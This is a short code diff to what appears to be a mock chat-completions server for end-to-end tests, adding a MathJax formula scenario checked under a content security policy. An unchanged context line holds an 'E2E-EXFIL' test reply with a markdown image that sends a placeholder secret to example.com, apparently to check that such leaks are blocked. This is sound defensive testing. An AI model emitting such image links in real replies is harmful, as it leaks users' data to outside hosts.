@@ -144,6 +144,10 @@ def completions():
     if "E2E-EXFIL" in last:
         words = ["Voici", "![pixel](https://example.com/pixel.png?secret=E2E-SECRET)"]
         delay = 0.05
+    # Scénario E2E-MATH : une formule, que MathJax (script local) doit rendre sous CSP.
+    elif "E2E-MATH" in last:
+        words = ["Formule", ":", "$$x^2+1$$"]
+        delay = 0.05
     elif slow:
         words = ("je réfléchis posément, morceau par morceau, " * 8).split(" ")
         delay = 1.2
